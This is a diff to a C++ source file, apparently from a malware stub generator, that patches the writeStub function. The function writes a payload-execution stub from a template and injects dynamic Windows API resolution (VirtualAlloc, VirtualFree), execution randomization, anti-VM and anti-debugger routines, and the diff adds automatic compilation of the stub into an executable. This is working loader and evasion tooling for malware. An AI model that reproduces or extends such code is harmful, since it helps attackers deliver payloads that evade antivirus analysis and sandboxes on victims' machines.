@@ -1,6 +1,5 @@
-#include "utils.h"
-#include <fstream>
 #include <iostream>
+#include <fstream>
 #include <iomanip>
 #include <sstream>
 #include <cstring>
@@ -10,6 +9,8 @@
 #include <filesystem>
 #include <random>
 #include <regex>
+#include "utils.h"
+#include "flags.h"
 
 using namespace std;
 
@@ -419,7 +420,7 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
         }
 
         // Check dynamic API resolution flag first so that anti vm api calls dont get updated in the case that both flags are set 
-        if(flags[3] == true){
+        if(flags[DYN] == true){
             // Replacing the calls in execute() first before the resolution logic is added, so the LoadLibraryA() call used when loading kernel32.dll is not replaced
             line = regex_replace(line, regex("\\bVirtualAlloc\\b"), "pVirtualAlloc");
             line = regex_replace(line, regex("\\bVirtualFree\\b"), "pVirtualFree");
@@ -435,33 +436,50 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
             if ((pos = line.find("/*DYN_RESOLUTION*/")) != string::npos) {
                 line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
             }
+
+            cout << "\nset dynamic api resolution\n";
+            flags[DYN] = false;
         }
 
-        if (flags[0] == true){
+        if (flags[RAND] == true){
             if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
                 line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
+            }
+            // dictionary in resource
+            // choose random selection of words and populate large vector to replace /*ENTROPY*/
+            if ((pos = line.find("/*ENTROPY*/")) != string::npos) {
+                line.replace(pos, strlen("/*ENTROPY*/"), "/*ENTROPY*/");
             }
             if ((pos = line.find("execute(payload);")) != string::npos) {
                 line.replace(pos, strlen("execute(payload);"), RAND_CALL);
             }
+            
+            cout << "\nset randomizaton\n";
+            flags[RAND] = false;
         }
         
-        if (flags[1] == true){
+        if (flags[VM] == true){
             if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                 line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
             }
             if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
                 line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
             }
+
+            cout << "\nset antiVM\n";
+            flags[VM] = false;
         }
 
-        if (flags[2] == true){
+        if (flags[DB] == true){
             if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
                 line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
             }
             if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
                 line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
             }
+
+            cout << "\nset antiDB\n";
+            flags[DB] = false;
         }
 
         outputFile << line << endl;
@@ -470,5 +488,20 @@ void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, con
     file.close();
     outputFile.close();
 
-    cout << "\nSuccessfully wrote stub to: " << outputPath;
+    cout << "\nSuccessfully wrote stub to: " << outputPath << "\n";
+
+    if(flags[COMPILE] == true){
+        cout << "\ncompiling stub...\n";
+        string tmp = "make out/stub_" + name + ".exe";
+        const char *command = tmp.c_str();
+
+        int out = system(command);
+        if(out == 0){
+            cout << "\ncompilation successful\n";
+            cout << "->\t/out/stub_" << name << ".exe\n";
+        } else {
+            cerr << "\ncompilation failed\n";
+        }
+
+    }
 }
